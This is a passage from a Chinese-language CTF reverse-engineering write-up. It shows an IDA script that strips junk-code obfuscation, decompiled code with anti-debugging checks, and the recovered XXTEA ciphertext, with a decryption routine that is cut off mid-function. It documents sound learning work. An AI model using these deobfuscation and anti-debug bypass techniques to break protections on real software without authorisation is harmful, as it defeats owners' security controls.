punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>JmpRaxAddr <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token comment\">// 第一部分垃圾指令长度</span>\n        <span class=\"token keyword\">auto</span> TrushCodeLength_1 <span class=\"token operator\">=</span> CallAddr <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>addr <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">+</span> CodeLength<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 第二部分垃圾指令长度</span>\n        <span class=\"token keyword\">auto</span> TrushCodeLength_2 <span class=\"token operator\">=</span> JmpRaxAddr <span class=\"token operator\">-</span> CallAddr <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// Nop掉无用的所有代码</span>\n        <span class=\"token function\">NopCode</span><span class=\"token punctuation\">(</span>CallAddr<span class=\"token punctuation\">,</span> TrushCodeLength_2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">NopCode</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> <span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">NopCode</span><span class=\"token punctuation\">(</span>addr <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">+</span> CodeLength<span class=\"token punctuation\">,</span> TrushCodeLength_1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 一共两种地址计算，加和减</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Mode <span class=\"token operator\">==</span> <span class=\"token number\">0xffC32B48</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            CalcAddr <span class=\"token operator\">=</span> CalcAddr <span class=\"token operator\">-</span> ebx<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Mode <span class=\"token operator\">==</span> <span class=\"token number\">0xffC30348</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            CalcAddr <span class=\"token operator\">=</span> CalcAddr <span class=\"token operator\">+</span> ebx<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">auto</span> JmpCodeAddr <span class=\"token operator\">=</span> EndAddr<span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 计算相对跳转地址</span>\n        <span class=\"token keyword\">auto</span> JmpOffset <span class=\"token operator\">=</span> CalcAddr <span class=\"token operator\">-</span> JmpCodeAddr <span class=\"token operator\">+</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 写入jmp指令</span>\n        <span class=\"token function\">PatchByte</span><span class=\"token punctuation\">(</span>JmpCodeAddr<span class=\"token punctuation\">,</span> <span class=\"token number\">0xE9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">PatchDword</span><span class=\"token punctuation\">(</span>JmpCodeAddr <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> JmpOffset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// jmp的地址为下一次deobf起始地址</span>\n        addr <span class=\"token operator\">=</span> CalcAddr<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>执行完，把main_0剩余代码都手动nop即可。</p>\n<p><img src=\"/images/44-1744626745338-49.png\"></p>\n<p>然后Apply patches to input file，应用一下patch，重新打开ida载入程序分析。</p>\n<p>从main_0的jmp进入两层到这边，然后用IDA Delete Function删除sub_1401F7B77函数，然后对jmp那边按E即可重新重构完main函数（如图2），F5即可分析。</p>\n<p><img src=\"/images/45-1744626745338-50.png\"></p>\n<p><img src=\"/images/46-1744626745338-51.png\"></p>\n<p>Main函数原代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">int</span> __fastcall <span class=\"token function\">main_0</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  __int64 v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rbp</span>\n  __int64 v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rdi</span>\n  __int64 i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rcx</span>\n  _DWORD <span class=\"token operator\">*</span>v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rdi</span>\n  HANDLE CurrentProcess<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span>\n  __int64 v9<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp-20h] [rbp-458h] BYREF</span>\n  _DWORD v10<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-438h] BYREF</span>\n  _BYTE v11<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-430h] BYREF</span>\n  _BYTE <span class=\"token operator\">*</span>v12<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+48h] [rbp-3F0h]</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v13<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+64h] [rbp-3D4h]</span>\n  <span class=\"token keyword\">int</span> v14<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+84h] [rbp-3B4h]</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v15<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+A4h] [rbp-394h]</span>\n  <span class=\"token keyword\">int</span> v16<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+C4h] [rbp-374h]</span>\n  <span class=\"token keyword\">int</span> v17<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+E4h] [rbp-354h]</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> k<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+104h] [rbp-334h]</span>\n  <span class=\"token keyword\">int</span> v19<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+124h] [rbp-314h]</span>\n  <span class=\"token keyword\">int</span> v20<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+144h] [rbp-2F4h]</span>\n  <span class=\"token keyword\">int</span> v21<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+164h] [rbp-2D4h]</span>\n  _DWORD v22<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+188h] [rbp-2B0h] BYREF</span>\n  <span class=\"token keyword\">unsigned</span> __int16 v23<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1B4h] [rbp-284h]</span>\n  BOOL v24<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1D4h] [rbp-264h] BYREF</span>\n  <span class=\"token keyword\">unsigned</span> __int64 j<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1F8h] [rbp-240h]</span>\n  <span class=\"token keyword\">unsigned</span> __int64 v26<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+218h] [rbp-220h]</span>\n  _DWORD v27<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+238h] [rbp-200h]</span>\n  <span class=\"token keyword\">unsigned</span> __int64 m<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+268h] [rbp-1D0h]</span>\n  <span class=\"token keyword\">int</span> v29<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+3F4h] [rbp-44h]</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v30<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+3F8h] [rbp-40h]</span>\n  <span class=\"token keyword\">int</span> v31<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+3FCh] [rbp-3Ch]</span>\n  __int64 v32<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+400h] [rbp-38h]</span>\n  <span class=\"token keyword\">int</span> v33<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+408h] [rbp-30h]</span>\n  <span class=\"token keyword\">unsigned</span> __int64 v34<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+410h] [rbp-28h]</span>\n  __int64 v35<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+428h] [rbp-10h]</span>\n  __int64 v36<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+430h] [rbp-8h]</span>\n\n  v36 <span class=\"token operator\">=</span> v3<span class=\"token punctuation\">;</span>\n  v35 <span class=\"token operator\">=</span> v4<span class=\"token punctuation\">;</span>\n  v7 <span class=\"token operator\">=</span> v10<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">170</span><span class=\"token punctuation\">;</span> i<span class=\"token punctuation\">;</span> <span class=\"token operator\">--</span>i <span class=\"token punctuation\">)</span>\n    <span class=\"token operator\">*</span>v7<span class=\"token operator\">++</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">858993460</span><span class=\"token punctuation\">;</span>\n  v34 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span>v10 <span class=\"token operator\">^</span> <span class=\"token number\">0x1401D9000LL</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">j___CheckForDebuggerJustMyCode</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1401ED104LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>v11<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">sub_140087C02</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1401A1190LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token function\">IsDebuggerPresent</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">sub_1400868E3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    v12 <span class=\"token operator\">=</span> v11<span class=\"token punctuation\">;</span>\n    <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>v22<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    v23 <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n    v29 <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n    v20 <span class=\"token operator\">=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\n    v15 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    v16 <span class=\"token operator\">=</span> <span class=\"token number\">0x61C88646</span><span class=\"token punctuation\">;</span>\n    v21 <span class=\"token operator\">=</span> <span class=\"token number\">0x95664B48</span><span class=\"token punctuation\">;</span>\n    v19 <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span>\n    v24 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    CurrentProcess <span class=\"token operator\">=</span> <span class=\"token function\">GetCurrentProcess</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">CheckRemoteDebuggerPresent</span><span class=\"token punctuation\">(</span>CurrentProcess<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v24<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v24 <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token function\">j_srand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xAABBu</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>j <span class=\"token punctuation\">)</span>\n        v22<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">j_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">&#123;</span>\n        v29 <span class=\"token operator\">=</span> v19<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span>\n        v30 <span class=\"token operator\">=</span> v29 <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v30 <span class=\"token punctuation\">)</span>\n          <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        v15 <span class=\"token operator\">+=</span> v16<span class=\"token punctuation\">;</span>\n        v17 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v15 <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> k <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> k <span class=\"token operator\">&lt;</span> v23<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>k <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n          v26 <span class=\"token operator\">=</span> <span class=\"token function\">__rdtsc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          v13 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">[</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>k <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> v23<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n          v29 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> v13<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">[</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>k <span class=\"token operator\">+</span> v23 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> v23<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          v30 <span class=\"token operator\">=</span> k <span class=\"token operator\">+</span> v23 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n          v31 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">[</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v30 <span class=\"token operator\">%</span> v23<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v13 <span class=\"token operator\">>></span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> v29<span class=\"token punctuation\">;</span>\n          v32 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8<span class=\"token punctuation\">)</span>v17 <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8<span class=\"token punctuation\">)</span>k<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n          v33 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">[</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v30 <span class=\"token operator\">%</span> v23<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> v22<span class=\"token punctuation\">[</span>v32<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v13 <span class=\"token operator\">^</span> v15<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v31<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">[</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> k<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n          <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">[</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v33<span class=\"token punctuation\">;</span>\n          v14 <span class=\"token operator\">=</span> v33<span class=\"token punctuation\">;</span>\n          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">__rdtsc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> v26 <span class=\"token operator\">></span> <span class=\"token number\">0x83C0</span> <span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">goto</span> LABEL_20<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token punctuation\">&#125;</span>\n      v27<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0xA9934E2F</span><span class=\"token punctuation\">;</span>\n      v27<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x30B90FA</span><span class=\"token punctuation\">;</span>\n      v27<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0xDCBF1D3</span><span class=\"token punctuation\">;</span>\n      v27<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x328B5BDE</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> m <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> m <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>m <span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v27<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> v10<span class=\"token punctuation\">[</span>m <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n          <span class=\"token function\">sub_140087C02</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1401A11A8LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          <span class=\"token function\">j_system</span><span class=\"token punctuation\">(</span>byte_1401A11A0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          <span class=\"token keyword\">goto</span> LABEL_20<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token function\">sub_140087C02</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1401A11C0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">j_system</span><span class=\"token punctuation\">(</span>byte_1401A11A0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\nLABEL_20<span class=\"token operator\">:</span>\n  <span class=\"token function\">j__RTC_CheckStackVars</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v9<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>_RTC_framedesc <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>unk_1401A1140<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">j___security_check_cookie</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span>v10 <span class=\"token operator\">^</span> v34<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token function\">sub_1401F8E9B</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>很清晰看出来是XXTEA加密，密钥是固定种子随机数随机得到的，Delta被魔改，然后密文也能看到。</p>\n<p><strong>注：写WP时用的是旧版附件分析，缺失了后面16字节密文</strong></p>\n<p>完整密文数据：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token number\">0xa9934e2f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30b90fa</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xdcbf1d3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x328b5bde</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x44fab4e</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1dcf0051</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x85ebbe55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x93aa773a</span></code></pre>\n\n<p>解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DELTA</span> <span class=\"token expression\"><span class=\"token number\">0x61C88646</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MX</span> <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>z <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">^</span> y <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>y <span class=\"token operator\">>></span> <span class=\"token number\">3</span> <span class=\"token operator\">^</span> z <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>sum <span class=\"token operator\">^</span> y<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> e<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">xxtea</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> <span class=\"token operator\">*</span>v<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">,</span> <span class=\"token keyword\">uint32_t</span> <span class=\"token keyword\">const</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint32_t</span> y<span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">,</span> sum<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> p<span class=\"token punctuation\">,</span> rounds<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>n <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">/* Coding Part */</span>\n    <span class=\"token punctuation\">&#123;</span>\n        rounds <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span>\n        sum <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">do</span>\n        <span class=\"token punctuation\">&#123;</span>\n            sum <span class=\"token operator\">+=</span> DELTA<span class=\"token punctuation\">;</span>\n            e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>sum <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">&lt;</span> n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> p<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>p <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>p<span class=\"token punctuation\">]</span> <span class=\"token 